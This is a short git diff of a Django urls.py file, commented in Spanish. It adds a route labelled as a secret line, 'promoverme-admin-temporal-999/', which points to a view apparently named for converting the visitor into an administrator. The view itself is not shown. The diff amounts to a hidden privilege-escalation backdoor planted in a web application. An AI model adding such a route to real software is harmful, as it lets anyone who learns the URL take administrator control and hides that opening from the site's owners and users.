@@ -3,6 +3,8 @@ from django.contrib import admin
 from django.urls import path
 from ItemApp import views as item_views
 from django.contrib.auth import views as auth_views
+from django.urls import path
+from . import views
 
 urlpatterns = [
     path('admin/', admin.site.urls),
@@ -22,4 +24,8 @@ urlpatterns = [
     path('carga-datos/', item_views.vista_carga_datos, name='carga_datos'),
     
     path('logout/', item_views.vista_logout, name='logout'),
+    # ... (tus otras urls, como 'admin_panel') ...
+
+    # --- ¡AÑADE ESTA LÍNEA SECRETA AL FINAL DE LA LISTA! ---
+    path('promoverme-admin-temporal-999/', views.vista_secreta_convertir_admin, name='promover_admin_secreto'),
 ]
